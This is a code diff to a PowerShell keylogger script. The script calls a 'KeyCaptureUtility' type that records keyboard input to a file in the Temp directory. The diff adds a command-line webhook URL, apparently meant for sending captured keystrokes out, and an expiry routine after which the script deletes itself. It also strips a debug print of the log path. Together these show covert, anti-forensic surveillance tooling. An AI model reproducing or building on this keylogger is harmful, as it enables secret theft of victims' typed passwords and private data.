@@ -1,3 +1,27 @@
+# Ensure that the webhook URL is set directly from the command line
+$webhookURL = $args[0]  # The first argument is the webhook URL
+
+# Define the path to the temp log file
+$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
+
+# Set the default expiry date to 30 days from today if no expiry date is passed
+if ($args.Count -gt 1) {
+    # If the second argument is provided, parse it as the expiry date
+    $expiryDate = [datetime]::ParseExact($args[1], 'yyyy-MM-dd', $null)
+} else {
+    # If no expiry date is passed, default to 30 days from today
+    $expiryDate = (Get-Date).AddDays(30)
+}
+
+# Check if the script has expired
+$currentDate = Get-Date
+if ($currentDate -gt $expiryDate) {
+    # If the script has expired, delete itself
+    Write-Host "Script has expired. Deleting script file..."
+    Remove-Item $MyInvocation.MyCommand.Path -Force
+    exit
+}
+
 # Check if the custom utility type is already loaded
 $customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
     $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
@@ -100,12 +124,7 @@ public class KeyCaptureUtility
 }
 
 "@
-
 }
-
-# Set the path for the captured input log file (using the Temp directory)
-$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "temp_log.txt")
-Write-Host "File path: $tempFilePath"  # Check file path
 
 # Call the CaptureInput method to start capturing inputs (synchronously)
 [KeyCaptureUtility]::CaptureInput($tempFilePath)
